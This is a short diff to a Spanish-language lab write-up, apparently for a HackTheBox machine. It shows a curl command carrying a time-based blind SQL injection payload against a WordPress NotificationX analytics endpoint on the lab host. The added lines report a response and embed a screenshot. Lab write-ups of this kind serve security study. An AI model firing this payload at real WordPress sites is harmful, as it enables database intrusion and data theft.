@@ -190,3 +190,6 @@ Para testear si el sitio web http://architects.htb es vulnerable replicaremos lo
 ```python
 ❯ time curl http://architects.htb/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
 ```
+
+btenemos una respuesta 
+![[Pasted image 20240907225602.png]]
